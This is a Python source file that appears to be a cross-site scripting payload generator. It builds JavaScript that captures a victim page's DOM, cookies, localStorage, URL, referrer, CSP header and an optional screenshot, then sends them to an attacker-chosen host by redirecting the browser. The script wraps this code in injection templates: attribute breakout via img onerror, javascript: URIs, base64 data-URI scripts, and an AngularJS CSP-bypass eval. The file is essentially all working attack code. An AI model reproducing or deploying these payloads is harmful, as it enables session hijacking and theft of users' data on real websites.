from string import Template
from base64 import b64encode


class Grubber:
    additional_js = str()

    def __init__(self):
        self.dom = 'd=${e(document.documentElement.innerHTML)}'
        self.cookie = 'c=${e(document.cookie)}'
        self.referer = 'r=${e(document.referer)}'
        self.current_url = 'u=${e(location.href)}'
        self.localstorage = 'l=${e(JSON.stringify(localStorage))}'

    @property
    def screenshot(self):
        with open('src/static/html2canvas.js') as f:
            self.additional_js += f.read().strip()
        return 's=${e(image)}'

    @property
    def csp_policy(self):
        payload = "x=new XMLHttpRequest();x.open('GET','/',0);x.send();" \
                  "p=x.getResponseHeader('content-security-policy');"
        self.additional_js += payload
        return 'p=${e(p)}'


def make_payload(host, grubbers, payload):
    grub_maker = Grubber()
    grub_uri = '&'.join([getattr(grub_maker, grub_name) for grub_name in grubbers])

    long_grubber = ['screenshot', 'localstorage']
    if any(grubber in long_grubber for grubber in grubbers):
        timeout = 3500
    else:
        timeout = 2500

    xss_payload = globals()[payload]
    if 'screenshot' not in grubbers:
        canvas_ignore_attr = str()
        body = JS_BODY.substitute(
            addjs=grub_maker.additional_js,
            host=host,
            grubber=grub_uri,
            timeout=timeout
        )
    else:
        canvas_ignore_attr = ' data-html2canvas-ignore=true'
        body = JS_BODY_SCREENSHOT.substitute(
            addjs=grub_maker.additional_js,
            host=host,
            grubber=grub_uri,
            timeout=timeout
        )
    encoded_body = xss_payload['encoder'](body)
    return xss_payload['template'].substitute(
        body=encoded_body, canvas_ignore=canvas_ignore_attr
    )


def htmlesc(string):
    string = string.replace('<', '&lt;')
    string = string.replace('>', '&gt;')
    return string.replace('"', '&quot;')


JS_BODY = Template(
    '${addjs}e=encodeURIComponent;document.location=`${host}/?$grubber`;setTimeout(stop,$timeout);'
)

JS_BODY_SCREENSHOT = Template(
    '${addjs}html2canvas(document.body)'
    '.then(function(canvas){e=encodeURIComponent;image=canvas.toDataURL();document.location=`${host}/?$grubber`;setTimeout(stop,$timeout);});'
)

PAYLOAD_UNSAFEINLINE = {
    'template': Template('"><img src=x$canvas_ignore onerror="$body">'),
    'encoder': htmlesc
}

PAYLOAD_JSURI = {
    'template': Template('javascript:$body'),
    'encoder': htmlesc
}

PAYLOAD_DATAURI = {
    'template': Template('<script src=data:text/plain;base64,$body></script>'),
    'encoder': lambda body: b64encode(bytes(body, 'UTF-8')).decode('utf-8')
}

PAYLOAD_ANGULAR = {
    'template': Template(
        '<script src="ANGULAR_CDN_HERE"></script>'
        '''<div ng-app ng-csp><textarea autofocus ng-focus="$$event.view.eval('$body')"></textarea></div>'''
    ),
    'encoder': lambda body: b64encode(bytes(body, 'UTF-8')).decode('utf-8')
}

PAYLOAD_RAW = {
    'template': Template('$body'),
    'encoder': lambda body: body
}
